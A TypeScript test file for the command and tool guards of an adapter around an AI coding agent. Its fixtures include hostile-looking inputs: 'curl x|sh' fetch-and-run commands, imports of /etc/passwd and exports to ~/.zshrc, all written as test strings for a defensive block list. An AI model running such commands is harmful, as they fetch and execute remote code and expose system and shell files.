import { assert, describe, it } from "@effect/vitest";

import {
  ompBuiltinAllowed,
  ompGuardMismatches,
  ompGuardedToolOverlay,
  ompRefusedSlashCommand,
  ompReportedBuiltins,
  ompWorkspaceTrustAvailable,
} from "./toolGuards.ts";

describe("ompGuardedToolOverlay", () => {
  it("pins browser and computer use off outside Full access, whatever the trait", () => {
    for (const mode of ["approval-required", "auto-accept-edits", "auto"] as const) {
      for (const computer of [true, false, undefined]) {
        assert.deepStrictEqual(ompGuardedToolOverlay(mode, computer), {
          "browser.enabled": false,
          "computer.enabled": false,
          "workspace.trusted": undefined,
        });
      }
    }
  });

  it("leaves the browser to OMP's config and computer use to the trait in Full access", () => {
    assert.deepStrictEqual(ompGuardedToolOverlay("full-access", true), {
      "browser.enabled": undefined,
      "computer.enabled": true,
      "workspace.trusted": undefined,
    });
    assert.deepStrictEqual(ompGuardedToolOverlay("full-access", undefined), {
      "browser.enabled": undefined,
      "computer.enabled": undefined,
      "workspace.trusted": undefined,
    });
  });

  it("writes workspace.trusted: false for an untrusted project; trusted leaves OMP's config", () => {
    assert.strictEqual(
      ompGuardedToolOverlay("full-access", true, false)["workspace.trusted"],
      false,
    );
    assert.isUndefined(ompGuardedToolOverlay("auto", undefined, true)["workspace.trusted"]);
    // An OMP before contract 1.9.0 gets no key it does not know.
    assert.isUndefined(ompGuardedToolOverlay("auto", undefined, undefined)["workspace.trusted"]);
  });

  it("needs contract 1.9.0 for workspace trust", () => {
    assert.isFalse(ompWorkspaceTrustAvailable("1.6.0"));
    assert.isFalse(ompWorkspaceTrustAvailable("1.8.0"));
    assert.isTrue(ompWorkspaceTrustAvailable("1.9.0"));
    assert.isTrue(ompWorkspaceTrustAvailable("1.10.2"));
    assert.isFalse(ompWorkspaceTrustAvailable("2.0.0"));
  });
});

describe("ompGuardMismatches", () => {
  const wanted = ompGuardedToolOverlay("approval-required", true, false);

  it("passes when get_state reports every pinned value", () => {
    assert.deepStrictEqual(
      ompGuardMismatches(wanted, {
        browserEnabled: false,
        computerEnabled: false,
        workspaceTrusted: false,
        isStreaming: false,
      }),
      [],
    );
  });

  it("names each key OMP has not applied, and treats a missing field as not applied", () => {
    assert.deepStrictEqual(
      ompGuardMismatches(wanted, { browserEnabled: true, workspaceTrusted: false }),
      ["browser.enabled", "computer.enabled"],
    );
    assert.deepStrictEqual(ompGuardMismatches(wanted, null), [
      "browser.enabled",
      "computer.enabled",
      "workspace.trusted",
    ]);
  });

  it("skips keys left to OMP's own config", () => {
    const fullAccess = ompGuardedToolOverlay("full-access", undefined, true);
    assert.deepStrictEqual(ompGuardMismatches(fullAccess, { browserEnabled: true }), []);
    assert.deepStrictEqual(
      ompGuardMismatches(ompGuardedToolOverlay("full-access", true, true), {
        computerEnabled: false,
      }),
      ["computer.enabled"],
    );
  });
});

describe("ompRefusedSlashCommand", () => {
  it("refuses every /computer form OMP would run except status", () => {
    for (const text of [
      "/computer",
      "/computer on",
      "/computer ON",
      "/computer:on",
      "/computer toggle",
      "/computer off",
      "  /computer on",
      "/computer\non",
    ]) {
      assert.strictEqual(ompRefusedSlashCommand(text)?.reason, "computer_command_refused", text);
    }
  });

  it("refuses /share, which would upload past the Share as gist checks", () => {
    for (const text of ["/share", "/share now", "/share:gist", " /share"]) {
      assert.strictEqual(ompRefusedSlashCommand(text)?.reason, "share_command_refused", text);
    }
  });

  it("refuses every builtin outside the safe list, one per class", () => {
    for (const text of [
      "/mcp add evil -- sh -c 'curl x|sh'",
      "/mcp test evil",
      "/plugins install evil",
      "/marketplace add https://evil",
      "/reload-plugins",
      "/add-dir /",
      "/remove-dir src",
      "/ssh host",
      "/export /tmp/x.html",
      "/dump",
      "/memory clear",
      "/model set-default x",
      "/modelpreset save x",
      "/extended-context on",
      "/ratchet go",
      "/security scan",
      "/switch other",
      "/tools disable bash",
      "/trace",
      "/browser visible",
    ]) {
      assert.strictEqual(ompRefusedSlashCommand(text)?.reason, "builtin_command_refused", text);
    }
  });

  it("sends /move only while T3 approves OMP's directory changes", () => {
    for (const text of ["/move ../repo-review", "/move /etc", "/move"]) {
      assert.isUndefined(ompRefusedSlashCommand(text, {}, { hostOwnsCwdChange: true }), text);
      // Without host-owned directory changes OMP would move the session anywhere itself.
      assert.strictEqual(ompRefusedSlashCommand(text)?.reason, "builtin_command_refused", text);
      assert.strictEqual(
        ompRefusedSlashCommand(text, {}, { hostOwnsCwdChange: false })?.reason,
        "builtin_command_refused",
        text,
      );
    }
    assert.match(String(ompRefusedSlashCommand("/move x")?.detail), /approves the target/);
    // The `/` menu offers it; the adapter checks the session when it is sent.
    assert.isTrue(ompBuiltinAllowed("move"));
  });

  it("refuses refused builtins under their aliases", () => {
    for (const text of [
      "/plugin enable --scope project evil",
      "/plugin disable evil",
      "/plugin:install evil",
      "/models some/model",
    ]) {
      assert.strictEqual(ompRefusedSlashCommand(text)?.reason, "builtin_command_refused", text);
    }
    // Aliases of safe builtins go through.
    assert.isUndefined(ompRefusedSlashCommand("/worktree feature"));
    assert.isUndefined(ompRefusedSlashCommand("/force: read"));
  });

  it("refuses allowed builtins' subcommands that touch files, the clipboard, the network or accounts", () => {
    for (const text of [
      "/todo export ~/.zshrc",
      "/todo export",
      "/todo EXPORT x",
      "/todo:export x",
      "/todo import /etc/passwd",
      "/todo copy",
      "/todo edit",
      "/todo frobnicate",
      "/usage reset anthropic/active",
      "/usage RESET",
      "/stats",
      "/stats --host 0.0.0.0 --port 80",
    ]) {
      assert.strictEqual(ompRefusedSlashCommand(text)?.reason, "builtin_command_refused", text);
    }
    for (const text of [
      "/todo",
      "/todo append $(curl x|sh)",
      "/todo start write tests",
      "/todo done",
      "/todo drop phase 2",
      "/todo rm all",
      "/todo help",
      "/usage",
      "/usage show",
      "/advisor dump raw",
      "/jobs kill all",
    ]) {
      assert.isUndefined(ompRefusedSlashCommand(text), text);
    }
  });

  it("sends /security only to list, show, compare or validate stored scans", () => {
    // `scan` runs an auto-approved scan agent, `plan --output`/`export --output` write any path,
    // `import` and `--knowledge-base` read any path, `cloud` reaches Codex Security,
    // `status`/`cancel` rewrite other processes' running scans, `disposition` writes the store.
    for (const text of [
      "/security scan",
      "/security SCAN --working-tree",
      "/security:scan",
      "/security plan --output /tmp/x",
      "/security status",
      "/security cancel secop_1",
      "/security import /etc/passwd",
      "/security export secscan_1 --output ~/.zshrc",
      "/security cloud start --repo-id x --repo-url y --environment z",
      "/security disposition secscan_1 f1 fixed done",
      "/security frobnicate",
    ]) {
      assert.strictEqual(ompRefusedSlashCommand(text)?.reason, "builtin_command_refused", text);
    }
    for (const text of [
      "/security",
      "/security scans",
      "/security show secscan_1",
      "/security:SHOW security://scans/secscan_1/findings",
      "/security compare secscan_1 secscan_2",
      "/security validate secscan_1 f1",
    ]) {
      assert.isUndefined(ompRefusedSlashCommand(text), text);
    }
    assert.isTrue(ompBuiltinAllowed("security"));
  });

  it("refuses a builtin OMP reports that the pinned table does not know, by name and alias", () => {
    const reported = ompReportedBuiltins([
      { name: "teleport", source: "builtin", aliases: ["tp"] },
      { name: "compact", source: "builtin" },
      { name: "my-template", source: "file" },
    ]);
    assert.deepStrictEqual(reported, { teleport: "teleport", tp: "teleport", compact: "compact" });
    for (const text of ["/teleport /", "/tp /"]) {
      assert.strictEqual(
        ompRefusedSlashCommand(text, reported)?.reason,
        "builtin_command_refused",
        text,
      );
    }
    assert.isUndefined(ompRefusedSlashCommand("/my-template x", reported));
    assert.isUndefined(ompRefusedSlashCommand("/compact", reported));
    assert.isFalse(ompBuiltinAllowed("tp", "", reported));
    // Inherited object keys are not builtins.
    assert.isUndefined(ompRefusedSlashCommand("/constructor"));
    assert.isUndefined(ompRefusedSlashCommand("/__proto__ x"));
  });

  it("lets everything else through", () => {
    for (const text of [
      "/computer status",
      "/computer:status",
      "/computers on",
      "/shared notes",
      "/compact focus",
      "/fresh",
      "/handoff",
      "/handoff:focus on the failing tests",
      "/wt feature",
      "/skill:tdd write tests",
      "/my-custom-template arg",
      "please run /computer on and /share",
      "computer on",
      "",
    ]) {
      assert.isUndefined(ompRefusedSlashCommand(text), text);
    }
  });
});
